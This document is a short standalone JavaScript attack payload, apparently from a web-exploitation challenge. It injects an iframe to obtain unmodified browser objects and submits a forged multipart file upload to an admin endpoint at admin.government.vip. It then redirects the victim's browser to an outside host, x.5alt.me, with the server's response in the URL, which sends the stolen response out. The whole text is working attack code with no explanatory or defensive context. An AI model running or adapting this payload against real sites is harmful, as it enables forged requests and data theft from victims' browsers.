function ss(){
var aaa = document.getElementById('aaa')
Function = aaa.contentWindow.Function;XMLHttpRequest = aaa.contentWindow.XMLHttpRequest;Image = aaa.contentWindow.Image;alert = aaa.contentWindow.alert;
XMLHttpRequest.prototype.sendAsBinary||(XMLHttpRequest.prototype.sendAsBinary=function(a){for(var d=a.length,c=new Uint8Array(d),b=0;b<d;b++)c[b]=a.charCodeAt(b)&255;this.send(c)});function submitData(a,d,c){var b=new XMLHttpRequest;c&&(b.onload=c);b.open("post",a,!0);a="---------------------------"+Date.now().toString(16);b.setRequestHeader("Content-Type","multipart/form-data; boundary="+a);b.sendAsBinary("--"+a+"\r\n"+d.join("--"+a+"\r\n")+"--"+a+"--\r\n")}value=key="file";segments=[];segments.push('Content-Disposition: form-data; name="'+key+'"; filename="'+key+'"\r\nContent-Type: image/png\r\n\r\n'+value+"\r\n");submitData("http://admin.government.vip:8000/upload",segments,function(data){location='//x.5alt.me:9000/?'+(data.target.responseText)});
}
f=document.createElement('iframe');f.id='aaa';f.src='/aaa';f.onerror=ss;f.onload=ss;document.body.appendChild(f);

